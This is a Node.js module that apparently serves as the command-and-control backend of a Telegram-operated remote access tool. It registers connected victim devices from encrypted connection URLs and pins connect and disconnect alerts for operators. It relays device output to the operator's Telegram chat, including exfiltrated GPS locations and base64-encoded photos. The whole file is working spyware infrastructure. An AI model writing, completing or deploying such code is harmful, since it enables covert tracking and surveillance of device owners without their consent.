const crypto = require("./Crypto");
require("dotenv").config()
const KEY = process.env.KEY;

const newConnection=async(url,devices,socket,bot,admins)=>{
    try{
        const decryptedObject = JSON.parse(crypto.Decrypt(url,KEY))
    
    const name = decryptedObject.name;
    const os = decryptedObject.os;
    const ref = decryptedObject.ref;

    devices[name]={socket:socket,os:os,ref:ref}
    
    if(admins[ref]){
        const sentMessage = await bot.sendMessage(ref,`*CONNECTION* : _${name}_ (*${os}*)`,{parse_mode:'Markdown'})
        await bot.pinChatMessage(ref,sentMessage.message_id); //pin Logged in message for user   
    } 
}
    catch(e){
        console.log(e)
    }
}

const handleMessage=(data,url,socket,bot,admins,devices)=>{
    
    try{
        const decryptedObject = JSON.parse(crypto.Decrypt(url,KEY))
        const name = decryptedObject.name;
        const os = decryptedObject.os;
        const ref = decryptedObject.ref;

        const dataFormat = `<b>Response From : ${name} (${os})</b><pre>${data}</pre>`

        if(admins[ref]){
            //location format _loc|long|latt
            if(/_loc([^"]*)/.test(data)){
                const splittedData = data.split("|")
                bot.sendLocation(ref,splittedData[1],splittedData[2])
            }
            //img formmat img$|$data
            else if(/img$|\$.*$/.test(data)){
                const splittedData = data.split("$|$")
                bot.sendChatAction(ref, 'upload_photo');
                const base64Image = `data:image/jpeg;base64,${splittedData[1]}`
                const base64Data = base64Image.replace(/^data:image\/\w+;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                bot.sendPhoto(ref, buffer, { caption: 'Here is your photo!' });
            }   
            else{
                bot.sendMessage(ref,dataFormat,{parse_mode: 'HTML'})
            }
        }
    }
    catch(e){

    }
    
}


const handleSocketClose=async(devices,url,admins,bot)=>{
    const decryptedObject = JSON.parse(crypto.Decrypt(url,KEY))
    const name = decryptedObject.name;
    const os = decryptedObject.os;
    const ref = decryptedObject.ref;

    delete devices[name];
    if(admins[ref]){
        const sentMessage = await bot.sendMessage(ref,`*DISCONNECTION* : ${name} (*${os}*)`,{parse_mode:'Markdown'})
        await bot.pinChatMessage(ref,sentMessage.message_id); //pin Logged in message for user
    }
    
    
}

module.exports = {newConnection,handleSocketClose,handleMessage}